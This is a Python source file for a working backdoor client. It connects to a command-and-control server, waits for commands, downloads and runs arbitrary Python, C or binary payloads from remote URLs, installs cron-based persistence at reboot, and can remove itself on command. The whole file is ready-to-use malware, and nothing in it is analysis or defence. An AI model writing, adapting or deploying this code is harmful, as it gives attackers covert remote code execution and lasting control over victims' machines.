import socket, time, sys, threading, os
import urllib.request

client = socket.socket()
_sync = True

def _loadexec(_url, _name):
    try:    
        with urllib.request.urlopen(_url) as response:
            code = response.read()#.decode()
    
        with open(_name, 'wb') as f:
            f.write(code)
                
        if _name.lower().endswith('.py'):
            # execute python file
            os.system('python ' + _name)
        elif _name.lower().endswith('.c'):
            # execute C script
            os.system('gcc ' + _name)
            os.system('./a.out')
        else:
            # handle either ELF executable or SH script
            os.system('./' + _name)
            
        print('[+] Foreign binary executed successfully!')
    except:
        print('[!] Error loading foreign binary!')
    
def _persist():
    content = '''#!/bin/bash

_progname="''' + sys.argv[0] + '''"
_cmd="python3 ''' + __file__ + '''"

if ! crontab -l | grep -q "$_progname"; then
    (crontab -l 2>/dev/null; echo "@reboot $_cmd") | crontab -
fi

rm -- "$0"'''
    try:
        with open("persist.sh", "w") as file:
            file.write(content)
        
        os.system('chmod +x persist.sh')
        os.system('./persist.sh')
        print('[+] Backdoor will now resurrect @ startup!')
    except:
        print('[!] Failed start-up persistence operation!')

def _process(_command):
    global client, _sync
    
    # handle disconnect
    if _command.lower() == 'disconnect':
        print('[-] Disconnecting...')
        _sync = False
    
    # handle reconnect
    elif _command.lower() == 'reconnect':
        print('[+] Reconnecting...')
        client.close()
        main()
        
    # handle uninstall / self destruct
    elif _command.lower() == 'uninstall':
        print('[!] Uninstalling backdoor at request of the C2!')
        _sync = False
        client.close()
        os.remove(__file__)
        sys.exit()
        
    # enable start-up persistence
    elif _command.lower() == 'persist':
        _persist()
        
    # upload / execute operation
    elif _command.lower().startswith('exec'):
        try:
            _extract = _command.split(' ')
            _loadexec(_extract[1], _extract[2])
        except:
            print('[!] Error handling upload/execute function. Ignoring...')

def main():
    global client, _sync
    host = '0.0.0.0' # Replace w/ C2 IP
    port = 4444
    
    try:
        # establish socket connection to C2
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        client.connect((host, port))

        # inform C2 to client connection
        client.send('Armory call!'.encode())
        print('[*] Synchronizing with C2...')
        
        while _sync:
            # wait for incoming C2 command
            data = client.recv(1024)
            
            # successful C2 synchronization
            if data.decode() == "Welcome!":
                print('[!] Connected to C2!')
                
            # connection reset error / transmission cut-off
            elif data.decode().lower() == '':
                print('[!] Anomaly detected in transmission! Ignoring...')
                
            # response to keep alive request
            elif data.decode().lower() == 'ping':
                print('[*] Responding to C2 keep-alive...')
                client.send('pong'.encode())
                
            # C2 command detected. process information
            else:
                obey = threading.Thread(target=_process, args=(data.decode(),))
                obey.start()
                
    except KeyboardInterrupt:
        client.close()
        sys.exit('[!] Aborting...')
    except ConnectionRefusedError:
        client.close()
        print('[!] C2 unresponsive/down! Reconnecting in 30 seconds...')
        time.sleep(30)
        main()
    except ConnectionResetError:
        print('[-] Transmission reset! Reconnecting in 30 seconds...')
        time.sleep(30)
        main()
    except OSError:
        # reconnect/disconnect caused interrupt in .recv()
        pass
            
    sys.exit('[x] Client offline...')

if __name__ == "__main__":
    main()
